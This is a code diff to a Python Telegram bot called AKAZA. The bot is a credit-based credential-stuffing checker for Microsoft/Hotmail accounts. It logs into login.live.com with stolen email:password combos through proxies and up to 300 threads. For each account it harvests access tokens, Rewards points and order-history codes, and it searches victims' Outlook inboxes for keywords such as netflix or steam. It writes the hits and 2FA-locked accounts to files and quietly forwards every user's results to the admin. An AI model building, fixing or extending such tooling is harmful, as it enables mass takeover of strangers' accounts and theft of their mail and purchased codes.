@@ -51,7 +51,7 @@ class AkazaDatabase:
     def init_db(self):
         self._execute('''CREATE TABLE IF NOT EXISTS users (
             user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
-            credits INTEGER DEFAULT 999999, has_access INTEGER DEFAULT 1,
+            credits INTEGER DEFAULT 0, has_access INTEGER DEFAULT 1,
             is_banned INTEGER DEFAULT 0, is_mod INTEGER DEFAULT 0,
             total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0,
             join_date TEXT, access_expiry TEXT)''')
@@ -186,13 +186,13 @@ class AkazaChecker:
         try:
             auth_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'
             r = self.session.get(auth_url, timeout=12)
-            ppft = re.search('value=\\\\"(.+?)\\\\"', r.text, re.S) or re.search('value="(.+?)"', r.text, re.S) or re.search("sFTTag:'(.+?)'", r.text, re.S) or re.search('sFTTag:"(.+?)"', r.text, re.S) or re.search('name="PPFT".*?value="(.+?)"', r.text, re.S)
-            up = re.search('"urlPost":"(.+?)"', r.text, re.S) or re.search("urlPost:'(.+?)'", r.text, re.S) or re.search('<form.*?action="(.+?)"', r.text, re.S)
+            ppft = re.search(r'name="PPFT".*?value="(.+?)"', r.text, re.S) or re.search(r'value="(.+?)"', r.text, re.S)
+            up = re.search(r'"urlPost":"(.+?)"', r.text, re.S) or re.search(r'<form.*?action="(.+?)"', r.text, re.S)
             if not ppft or not up: return 'ERROR', None
             data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft.group(1)}
             r_login = self.session.post(up.group(1).replace('&amp;', '&'), data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=12)
             if '#' in r_login.url:
-                tk = parse_qs(urlparse(r_login.url).fragment).get('access_token', ['None'])[0]
+                tk = parse_qs(urlparse(r_login.url).fragment).get('access_token', [None])[0]
                 if tk and tk != 'None': return 'TOKEN', tk
             if any(v in r_login.text for v in ['recover?mkt', 'identity/confirm', 'Email/Confirm', '/Abuse?mkt=']): return '2FA', None
             if any(v in r_login.text.lower() for v in ['password is incorrect', "account doesn't exist", 'too many times']): return 'BAD', None
@@ -257,34 +257,43 @@ class AkazaChecker:
         return codes
 
     def scan_inbox_hit(self, email, tk, uk):
-        if not uk: return {}, "0"
-        cid = self.session.cookies.get("MSPCID", "").upper()
-        res, ic = {}, "0"
+        ic = "0"
         try:
             r_count = self.session.post(f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0", data="", headers={"authorization": f"Bearer {tk}", "action": "StartupData", "content-type": "application/json"}, timeout=12)
             m = re.search(r'"DisplayName":"Inbox","TotalCount":(\d+)', r_count.text)
             if m: ic = m.group(1)
         except: pass
-        h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json', 'Accept': 'application/json'}
-        for k in uk:
-            pay = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": f'"{k}"'}, "Size": 1}]}
-            try:
-                r = self.session.post("https://outlook.live.com/search/api/v2/query", json=pay, headers=h, timeout=10)
-                if r.status_code == 200:
-                    tot = r.json()['EntitySets'][0]['ResultSets'][0].get('Total', 0)
-                    if tot > 0: res[k] = tot
-            except: pass
+        res = {}
+        if uk:
+            cid = self.session.cookies.get("MSPCID", "").upper()
+            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json', 'Accept': 'application/json'}
+            for k in uk:
+                pay = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": f'"{k}"'}, "Size": 1}]}
+                try:
+                    r = self.session.post("https://outlook.live.com/search/api/v2/query", json=pay, headers=h, timeout=10)
+                    if r.status_code == 200:
+                        tot = r.json()['EntitySets'][0]['ResultSets'][0].get('Total', 0)
+                        if tot > 0: res[k] = tot
+                except: pass
         return res, ic
 
     async def check(self, email, password, uk=[]):
-        st, tk_flux = self.login_flux(email, password)
-        if st != 'TOKEN': return {'status': st.lower()}
-        pts = self.get_rewards_p7()
-        codes = self.get_order_history_flux()
-        tk_hit = self.login_hit(email, password)
-        inbox_data, ic = {}, "0"
-        if tk_hit: inbox_data, ic = self.scan_inbox_hit(email, tk_hit, uk)
-        return {'status': 'hit', 'email': email, 'password': password, 'pts': pts, 'codes': codes, 'inbox': inbox_data, 'inbox_count': ic}
+        try:
+            st, tk_flux = self.login_flux(email, password)
+            if st != 'TOKEN': return {'status': st.lower()}
+            pts = 0
+            try: pts = self.get_rewards_p7()
+            except: pass
+            codes = []
+            try: codes = self.get_order_history_flux()
+            except: pass
+            tk_hit = self.login_hit(email, password)
+            inbox_data, ic = {}, "0"
+            if tk_hit:
+                try: inbox_data, ic = self.scan_inbox_hit(email, tk_hit, uk)
+                except: pass
+            return {'status': 'hit', 'email': email, 'password': password, 'pts': pts, 'codes': codes, 'inbox': inbox_data, 'inbox_count': ic}
+        except: return {'status': 'error'}
 
 # ============================================================================
 # BOT HANDLERS
@@ -298,7 +307,11 @@ async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
     if db_api.is_banned(uid): return
     db_api.update_settings(uid, is_adding_kw=False)
     i, s = db_api.get_user_info(uid), db_api.get_user_settings(uid)
-    msg = (f"💠 <b>Dashboard</b> 💠\n\n👤 <b>User:</b> <code>{u.effective_user.first_name}</code>\n💰 <b>Credits:</b> <code>{i['credits']}</code>\n⚙️ <b>Threads:</b> <code>{s['threads']}</code>\n🔑 <b>Keywords:</b> <code>{len(s['keywords'])}</code>")
+    msg = (f"💠 <b>AKAZA Dashboard</b> 💠\n\n"
+           f"👤 <b>User:</b> <code>{u.effective_user.first_name}</code>\n"
+           f"💰 <b>Credits:</b> <code>{i['credits']}</code>\n"
+           f"⚙️ <b>Threads:</b> <code>{s['threads']}</code>\n"
+           f"🔑 <b>Keywords:</b> <code>{len(s['keywords'])}</code>")
     kbd = [[InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
            [InlineKeyboardButton("🔍 Keywords", callback_data="kw_mode"), InlineKeyboardButton("🔌 Proxy", callback_data="proxy")],
            [InlineKeyboardButton("📖 Help", callback_data="help")]]
@@ -336,12 +349,15 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
     s = db_api.get_user_settings(uid)
     px = user_proxies.get(uid, []) or PROXIES_LIST
     thr = min(s['threads'], 300) if px else min(s['threads'], 10)
+
     await c.bot.send_message(ADMIN_ID, f"🚀 User <code>{uid}</code> ({u.effective_user.first_name}) started checking {len(lines)} accounts.")
-    msg = await (u.callback_query.message.reply_text("🚀 Starting...") if u.callback_query else u.message.reply_text("🚀 Starting..."))
+    status_msg = await (u.callback_query.message.reply_text("🚀 Starting...") if u.callback_query else u.message.reply_text("🚀 Starting..."))
     hits, bad, tfa, err, checked, start_t, last_up, last_h = 0, 0, 0, 0, 0, time.time(), 0, []
+
     sid = str(uuid.uuid4().hex[:6])
     h_f, tfa_f = f"h_{sid}.txt", f"t_{sid}.txt"
     sem, up_lock = asyncio.Semaphore(thr), asyncio.Lock()
+
     async def worker(line):
         nonlocal hits, bad, tfa, err, checked, last_up
         async with sem:
@@ -358,17 +374,22 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
                 with open(h_f, 'a', encoding='utf-8') as f:
                     if os.path.getsize(h_f) == 0: f.write("@larpsupport\n\n")
                     f.write(f"{data['email']}:{data['password']} | Pts:{data['pts']} | Inbox:{data.get('inbox_count','0')} | Keywords:{json.dumps(data.get('inbox',{}))}\n")
-            elif st == '2fa': tfa += 1; open(tfa_f, 'a').write(f"{data['email']}:{data['password']}\n")
+            elif st == '2fa':
+                tfa += 1
+                with open(tfa_f, 'a', encoding='utf-8') as f: f.write(f"{data['email']}:{data['password']}\n")
             elif st == 'error': err += 1
             else: bad += 1
             async with up_lock:
                 if time.time() - last_up > 3 or checked == len(lines):
                     last_up = time.time(); el = time.time() - start_t; cpm = int((checked/el)*60) if el > 0 else 0
                     prg = f"🔄 **Live Check**\n\n📊 `{checked}/{len(lines)}` | ⚡ CPM: `{cpm}`\n🎯 Hits: `{hits}` | 💀 Bad: `{bad}`\n🔒 2FA: `{tfa}` | ❌ Errors: `{err}`\n\n🕒 Last Hits:\n`{' | '.join(last_h) or 'None'}`"
-                    try: await msg.edit_text(prg, parse_mode='Markdown')
+                    try: await status_msg.edit_text(prg, parse_mode='Markdown')
                     except: pass
+
     await asyncio.gather(*(worker(l) for l in lines))
     if uid in user_proxies: del user_proxies[uid]
+
+    sent_any = False
     for p, disp in [(h_f, "Hotmails Hits @darkcloudgateway.txt"), (tfa_f, "2fa.txt")]:
         if os.path.exists(p) and os.path.getsize(p) > 5:
             if p == h_f:
@@ -376,11 +397,16 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
             with open(p, 'rb') as f:
                 content = f.read()
                 f.seek(0)
+                # Send to User
                 if u.callback_query: await u.callback_query.message.reply_document(f, filename=disp, caption=f"✅ {disp}")
                 else: await u.message.reply_document(f, filename=disp, caption=f"✅ {disp}")
-                await c.bot.send_document(ADMIN_ID, io.BytesIO(content), filename=disp, caption=f"📁 User <code>{uid}</code> Result\n👤 Name: <code>{u.effective_user.first_name}</code>\n💰 Credits left: <code>{db_api.get_credits(uid)}</code>", parse_mode="HTML")
+                # Silent Admin Notify
+                if uid != ADMIN_ID:
+                    await c.bot.send_document(ADMIN_ID, io.BytesIO(content), filename=disp, caption=f"📁 User <code>{uid}</code> Result\n👤 Name: <code>{u.effective_user.first_name}</code>\n💰 Credits left: <code>{db_api.get_credits(uid)}</code>", parse_mode="HTML")
             os.remove(p)
-    if hits == 0 and tfa == 0:
+            sent_any = True
+
+    if not sent_any:
         txt = f"✅ Done! Hits: {hits} | 2FA: {tfa} | Bad: {bad}"
         if u.callback_query: await u.callback_query.message.reply_text(txt)
         else: await u.message.reply_text(txt)
@@ -394,7 +420,7 @@ async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
     elif q.data == "kw_mode":
         db_api.update_settings(uid, is_adding_kw=True)
         await q.edit_message_text("🔍 <b>Keyword Mode Activated</b>\n\nSend keywords separated by spaces.\nExample: <code>netflix spotify steam</code>\n\n/skw to stop, /ckw to clear.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
-    elif q.data == "proxy": await q.edit_message_text(f"🌐 <b>Proxy Settings</b>\nLoaded: <code>{len(user_proxies.get(uid, []))}</code>\nUpload .txt and select 'Proxy'.\nNote: Proxies are one-time use.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
+    elif q.data == "proxy": await q.edit_message_text(f"🌐 <b>Proxy Settings</b>\nLoaded: <code>{len(user_proxies.get(uid, []))}</code>\nTo add, upload a .txt file and select 'Proxy'.\nNote: Proxies are one-time use.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
     elif q.data == "help":
         txt = ("📖 <b>Help Section</b>\n\n"
                "<b>Commands:</b>\n"
@@ -415,7 +441,7 @@ async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
         await q.edit_message_text(f"✅ Loaded {len(user_proxies[uid])} proxies (one-time use).")
     elif q.data == "admin" and db_api.is_mod(uid):
         st = db_api.get_global_stats()
-        await q.edit_message_text(f"🛠 <b>Admin Panel</b>\n\nTotal Users: <code>{st['total']}</code>\nGlobal Checks: <code>{st['checks']}</code>\nGlobal Hits: <code>{st['hits']}</code>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
+        await q.edit_message_text(f"🛠 <b>Admin Panel</b>\n\nTotal Users: <code>{st['total']}</code>\nGlobal Checks: <code>{st['checks']}</code>\nGlobal Hits: <code>{st['hits']}</code>\n\nUse !!help for commands.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
 
 async def set_threads(u: Update, c: ContextTypes.DEFAULT_TYPE):
     if c.args:
@@ -430,26 +456,32 @@ async def cmd_ckw(u: Update, c: ContextTypes.DEFAULT_TYPE): db_api.update_settin
 async def admin_cmd_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
     if not db_api.is_mod(u.effective_user.id): return
     m = u.message.text.split(); cmd = m[0].lower(); args = m[1:]
-    if cmd == "!!addcredits" and len(args) == 2: db_api.add_credits(int(args[0]), int(args[1])); await u.message.reply_text("✅ Done.")
-    elif cmd == "!!grant" and len(args) == 1: db_api.grant_access(int(args[0])); await u.message.reply_text("✅ Done.")
-    elif cmd == "!!ban" and len(args) == 1: db_api.ban(int(args[0])); await u.message.reply_text("✅ Done.")
-    elif cmd == "!!broadcast" and args:
-        txt = u.message.text[len(cmd):].strip()
-        for t in db_api.get_all_user_ids():
-            try: await c.bot.send_message(t, txt); await asyncio.sleep(0.05)
-            except: pass
-        await u.message.reply_text("✅ Broadcast finished.")
-    elif cmd == "!!stats":
-        st = db_api.get_global_stats()
-        await u.message.reply_text(f"📊 <b>Admin Stats</b>\n\nUsers: {st['total']}\nChecks: {st['checks']}\nHits: {st['hits']}", parse_mode="HTML")
-    elif cmd == "!!help":
-        txt = ("🛠 <b>Admin Commands</b>\n\n"
-               "!!addcredits [uid] [amt]\n"
-               "!!grant [uid]\n"
-               "!!ban [uid]\n"
-               "!!broadcast [msg]\n"
-               "!!stats")
-        await u.message.reply_text(txt, parse_mode="HTML")
+    try:
+        if cmd == "!!addcredits" and len(args) == 2: db_api.add_credits(int(args[0]), int(args[1])); await u.message.reply_text("✅ Done.")
+        elif cmd == "!!grant" and len(args) == 1: db_api.grant_access(int(args[0])); await u.message.reply_text("✅ Done.")
+        elif cmd == "!!ban" and len(args) == 1: db_api.ban(int(args[0])); await u.message.reply_text("✅ Done.")
+        elif cmd == "!!mod" and len(args) == 1 and u.effective_user.id == ADMIN_ID: db_api.set_mod(int(args[0]), 1); await u.message.reply_text("✅ Done.")
+        elif cmd == "!!unmod" and len(args) == 1 and u.effective_user.id == ADMIN_ID: db_api.set_mod(int(args[0]), 0); await u.message.reply_text("✅ Done.")
+        elif cmd == "!!broadcast" and args:
+            txt = u.message.text[len(cmd):].strip()
+            count = 0
+            for t in db_api.get_all_user_ids():
+                try: await c.bot.send_message(t, txt); await asyncio.sleep(0.05); count += 1
+                except: pass
+            await u.message.reply_text(f"✅ Broadcast sent to {count} users.")
+        elif cmd == "!!stats":
+            st = db_api.get_global_stats()
+            await u.message.reply_text(f"📊 <b>Admin Stats</b>\n\nUsers: {st['total']}\nChecks: {st['checks']}\nHits: {st['hits']}", parse_mode="HTML")
+        elif cmd == "!!help":
+            txt = ("🛠 <b>Admin Commands</b>\n\n"
+                   "!!addcredits [uid] [amt]\n"
+                   "!!grant [uid]\n"
+                   "!!ban [uid]\n"
+                   "!!broadcast [msg]\n"
+                   "!!mod [uid]\n"
+                   "!!stats")
+            await u.message.reply_text(txt, parse_mode="HTML")
+    except Exception as e: await u.message.reply_text(f"❌ Error: {e}")
 
 def main():
     db_api.init_db()
